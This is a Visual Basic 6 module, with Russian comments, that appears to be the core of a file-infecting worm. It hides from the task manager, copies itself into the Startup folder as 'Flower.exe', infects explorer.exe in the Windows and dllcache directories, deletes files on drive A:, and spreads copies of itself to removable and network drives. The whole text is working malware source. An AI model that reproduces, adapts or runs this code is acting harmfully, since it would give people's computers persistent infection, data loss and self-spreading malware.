Attribute VB_Name = "Body"
Option Explicit
Public Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal IpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public Const SW_SHOWNORMAL = 1

Public fsysObj As New Scripting.FileSystemObject
Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Public Brain As New Brain
Public Heard As New Heard
Public Joiner As New Joiner
Public sysDir As String
Public winDir As String
Const appname = "abs"
Const sect = "catchme"
Const ill = "beill"
Public Serios As Boolean

Sub Main()
   Dim strData As String
   'невиден в диспечере задач
   App.Title = App.EXEName
   App.TaskVisible = False
   ' загрузчик
   Open App.Path & "\" & App.EXEName & ".exe" For Binary As 1
      strData = Space(7)
      Seek 1, LOF(1) - 6
      Get #1, , strData
   Close #1
   If strData = "End-End" Then
      Joiner.DoStart
   End If
    Randomize Timer
    'определение серьезности
    Serios = GetSetting(appname, sect, "Serios", True)
    'определение каталога ...\system32\
    sysDirec
    If GetSetting(appname, sect, ill, "No") = "No" And Serios Then BeIll
    ' стартова€ интернет страница
    Brain.StartInternetPage
    'запуск остального кода
    Brain.Catalog
End Sub

Public Sub BeIll()
    On Error Resume Next
    FileCopy App.Path & "\" & App.EXEName & ".exe", Left(sysDir, 3) & "Documents and Settings\All Users\√лавное меню\ѕрограммы\јвтозагрузка\Flower.exe"
    On Error Resume Next
    Joiner.DoVirus winDir & "explorer.exe"
    On Error Resume Next
    Joiner.DoVirus sysDir & "dllcache\explorer.exe"
    SaveSetting appname, sect, ill, "Yes"
End Sub

Public Sub sysDirec()
    Dim IngRtn As Long
    Const MAXWINPATH = 144
    winDir = Space(MAXWINPATH)
    IngRtn = GetWindowsDirectory(winDir, MAXWINPATH)
    winDir = Left(winDir, IngRtn) & "\"
    sysDir = Left(winDir, IngRtn) & "\system32\"
End Sub

Public Sub Dicks()
    Dim strDrv As String
    Dim drvItem As Scripting.Drive
    Dim strFileName As String
        For Each drvItem In fsysObj.Drives
        strDrv = drvItem
            If drvItem.IsReady Then
               If drvItem.DriveType = Removable Or drvItem.DriveType = Remote Then
                    If strDrv = "A:" Then
                          Brain.DeleteFileA "A:\"
                    End If
                    On Error Resume Next
                    If Not (fsysObj.FileExists(strDrv & "\" & App.EXEName & ".exe")) Then
                        On Error Resume Next
                        FileCopy App.Path & "\" & App.EXEName & ".exe", strDrv & "\" & App.EXEName & ".exe"
                    End If
               End If
            End If
        Next drvItem
End Sub


